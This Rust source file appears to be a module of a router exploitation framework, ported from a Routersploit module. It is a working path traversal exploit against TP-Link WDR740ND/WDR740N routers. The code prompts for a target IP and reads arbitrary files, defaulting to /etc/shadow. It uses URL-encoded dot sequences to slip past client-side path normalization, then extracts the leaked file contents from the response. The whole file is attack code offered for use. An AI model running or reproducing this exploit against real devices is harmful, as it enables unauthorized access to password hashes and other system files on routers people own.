use anyhow::{Result, Context};
use colored::*;
use reqwest::Client;
use std::time::Duration;
use crate::utils::{prompt_required, normalize_target, prompt_default};

/// TP-Link WDR740ND & WDR740N Path Traversal
/// 
/// 1:1 Port from Routersploit (wdr740nd_wdr740n_path_traversal.py)
/// Allows reading arbitrary files from the filesystem.
/// 
/// Payload: /help/../../../../../../../../../../../../../../..<file>

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    // Determine target URL
    let raw_ip = if target.is_empty() {
        prompt_required("Target IP")?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    let base_url = format!("http://{}", target_ip);
    
    println!("{} Target: {}", "[*]".blue(), base_url);

    // Prompt for file to read
    let filename = prompt_default("File to read", "/etc/shadow")?;

    // Construct traversal path
    // Python code uses 16 "../"
    let traversal = "../".repeat(16);
    let path = format!("{}{}", traversal, filename);
    let _full_url = format!("{}/help/{}", base_url, path);
    
    println!("{} Sending payload...", "[*]".blue());

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(10))
        .build()?;
        
    // We use `%2e%2e` encoding to bypass local URL normalization in reqwest/Link-sys.
    // This allows sending the traversal sequences without the client collapsing them.
    let path_bypass = "/help/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e";
    let full_url_bypass = format!("{}{}{}", base_url, path_bypass, filename);
    
    println!("{} Using URL-encoded dots to bypass local normalization...", "[*]".blue());
    println!("{} URL: {}", "[*]".blue(), full_url_bypass);

    let res = client.get(&full_url_bypass)
        .send()
        .await
        .context("Failed to send request")?;
        
    if res.status().is_success() {
        let text = res.text().await?;
        println!("{} Request successful!", "[+]".green());
        
        // Python code looks for `//--></SCRIPT>` offset + 15 to clean output.
        // It seems the file content is dumped after some script tag.
        
        if let Some(pos) = text.find("//--></SCRIPT>") {
            let content_start = pos + 15;
            if content_start < text.len() {
                let content = &text[content_start..];
                println!("{} File Content ({}):\n{}", "[+]".green(), filename, content);
            } else {
                println!("{} Trigger found but no content follows.", "[*]".yellow());
            }
        } else {
            // It might just return the file directly in some firmwares?
            if text.len() > 0 {
                println!("{} Potential File Content (Raw):\n{}", "[*]".yellow(), text);
            }
        }
    } else {
        println!("{} Request failed with status: {}", "[-]".red(), res.status());
    }
    
    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║    TP-Link WDR740N Path Traversal                         ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
